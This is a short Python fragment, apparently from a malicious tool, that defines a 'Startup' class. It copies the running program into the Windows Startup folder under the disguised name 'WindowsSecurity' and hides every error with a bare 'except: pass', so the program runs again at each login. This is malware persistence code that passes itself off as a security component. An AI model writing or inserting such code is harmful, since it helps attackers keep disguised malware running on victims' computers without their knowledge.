class Startup:

    def __init__(self):
        self.file = sys.argv[0]
        self._startup()
    
    def _startup(self):
        try:
            with open(f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.{self.file.split("\\")[-1].split(".")[-1]}', 'wb') as f:
                f.write(open(self.file, 'rb').read())
        except:pass